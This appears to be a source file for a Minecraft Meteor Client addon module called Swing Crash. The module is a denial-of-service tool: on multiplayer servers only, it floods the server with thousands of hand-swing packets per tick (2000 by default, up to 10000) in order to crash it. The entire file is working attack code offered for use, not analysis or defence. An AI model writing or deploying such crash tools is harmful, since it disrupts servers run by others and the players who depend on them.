package me.chirin.zeitgeist.modules.crystal.crash;

import me.chirin.zeitgeist.Zeitgeist;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.util.Hand;

public class SwingCrash extends Module {
    private final SettingGroup sgGeneral;
    private final Setting<Integer> amount;
    private final Setting<Boolean> autoDisable;

    public SwingCrash() {
        super(Zeitgeist.CATEGORYC, "Swing Crash", "Attempts to crash the server by spamming hand swing packets.");
        this.sgGeneral = this.settings.getDefaultGroup();
        this.amount = this.sgGeneral.add(((IntSetting.Builder) ((IntSetting.Builder) ((IntSetting.Builder) (new IntSetting.Builder()).name("amount")).description("How many packets to send to the server per tick.")).defaultValue(2000)).min(1).sliderMin(1).sliderMax(10000).build());
        this.autoDisable = this.sgGeneral.add(((BoolSetting.Builder) ((BoolSetting.Builder) ((BoolSetting.Builder) (new BoolSetting.Builder()).name("auto-disable")).description("Disables module on kick.")).defaultValue(true)).build());
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!mc.isInSingleplayer()) {
            for (int i = 0; i < (Integer) this.amount.get(); ++i) {
                if (this.mc.player != null) {
                    this.mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                }
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if ((Boolean) this.autoDisable.get()) {
            this.toggle();
        }

    }
}
